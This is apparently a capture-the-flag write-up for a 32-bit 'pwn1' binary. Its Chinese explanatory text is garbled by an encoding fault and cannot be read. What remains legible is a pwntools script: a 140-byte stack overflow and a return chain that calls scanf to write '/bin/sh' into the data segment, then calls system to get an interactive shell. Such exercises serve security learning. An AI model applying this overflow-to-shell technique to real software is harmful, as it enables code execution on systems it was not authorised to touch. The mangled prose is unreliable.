���������Ӧ������ShowInfo���档��  
����NXѡ�ջ��ɶҲִ�в��ˡ�����Ҫȥ��system

�տ�ʼ�е���㯣�system������ָ���ַ����ĵ�ַ�������ַ�������
ջ�����ݿ�д����ջ�ϵĵ�ַ�������̶���զ�쿩��
����ʥ˵�ⲻ�и�scanf�𡣡�Ȼ��Ͷ���

Ҫ������scanfȥ��/bin/sh�ŵ���ַ�̶�������ط����������ݶ�
������system����scanf�����ֽڲ�����أ�
pattern.py���Գ�����140

��scanf֮�������finish��Ѹ�ٵ�����return������һ�����Կ��ٽ��������ĺð취~~~

========================================================  
from pwn import *  
p=process('./pwn1')  
r=raw_input()  
scanf_addr=p32(0x80484f0)  
sys_addr=p32(0x80484b0)  
format_addr=p32(0x804888f)  
data_addr=p32(0x804a034)  
p.recvuntil('e:')  
p.sendline('a'*140+scanf_addr+sys_addr+format_addr+data_addr)  
p.recvuntil(':')  
p.sendline('1')  
p.sendline('/bin/sh\x00')  
p.interactive()  
========================================================  
�տ�ʼд����p.sendline('a'*140+scanf_addr+ '1'*4 +format_addr+data_addr)  
��Ϊ�м��Ǹ���ַ����ν����������ȥ���scanf��system����  
Ȼ�������Ӿͻᱨ0x31313131�޷����ʵĴ���Ϊjmp��scanf֮��ջ�����������ֱ�ӱ�����scanf��eipȥ������  
����֮�����ⷢ�ֿ���ֱ����systemû�����⣨��Ȼ�ƺ���Ҫ��add espȥ̧ջ�ģ���������ƺ������������й�~  
Ī���ľ�getshell��~����  